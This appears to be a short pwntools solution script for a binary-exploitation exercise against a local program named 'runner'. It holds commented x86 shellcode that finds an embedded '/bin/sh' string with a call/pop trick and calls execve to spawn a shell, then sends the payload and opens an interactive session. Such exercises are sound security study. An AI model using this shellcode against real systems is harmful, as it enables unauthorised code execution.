from pwn import *
from lib import *

# additional question: alternative solution

p, elf = start('./runner', args)

# "/bin/sh\x00" = 2f 62 69 6e 2f 73 68 00
payload = asm("""
## call function: -> pop ebx is a neat trick to get the address of pwn into ebx
call pwn
    pwn:
    pop ebx                 # ebx now stores &(pwn)
    ## diff = binsh - pwn   # we can find the offset to the string as we now know the address of pwn
    ## add ebx, diff        # now we do &(pwn) + offset_to_string (which is the string)

    lea ebx, [ebx+binsh-pwn]

    ## now, same as before, we just trigger execve(...)
    mov eax, 0xb    # eax = 0xb (execve)
    xor ecx, ecx    # ecx = 0 (NULL)
    xor edx, edx    # edx = 0 (NULL)
    xor esi, esi    # esi = 0 (NULL)

    int 0x80

    binsh: .string "/bin/sh"
""")

p.sendlineafter(b'that\n', payload)

p.interactive()
p.close()